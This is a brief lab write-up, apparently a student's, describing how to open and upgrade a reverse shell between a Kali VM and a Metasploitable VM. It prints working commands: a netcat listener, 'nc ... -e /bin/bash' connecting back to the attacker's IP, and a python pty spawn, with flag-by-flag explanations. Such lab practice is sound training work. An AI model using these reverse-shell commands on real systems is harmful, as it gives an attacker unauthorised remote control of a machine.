This exercise will include ways to activate a shell. 

1. Using netcat. This shell is opened with ease since I'm able to control both VMs involved from the start (Kali and Meta).

2. After starting up and setting IPs on the Kali and Meta VMs, I typed the following commands to activate a reverse shell on the attacking machine (kali).

3. Commands: 

On Kali, "nc -lnvp 2222" << use netcat -l (start a listener), -n (use numeric IP addresses), -v (with a verbose output), -p (specifying port number 2222)

On Meta, "nc 10.11.1.2 2222 -e /bin/bash" << use netcat to connect to the open listener on port 2222 on the Kali VM and then execute the bash terminal when doing so.

On Kali, "dir" and "ls" << check to see if the reverse shell is active and sending back the list of the current working directory

On Kali, "python -c 'import pty;pty.spawn("/bin/bash")'" << the current shell is lacking in capabilities so it may be best to activate a higher level shell. This script calls on python to execute a command (-c flag) and import the pty module so we can use .spawn("/bin/bash") to activate this higher level shell.

Alright, that was a quick and easy exercise. I'll get the pics to go with starting with the label shell_practice_pic1.png.
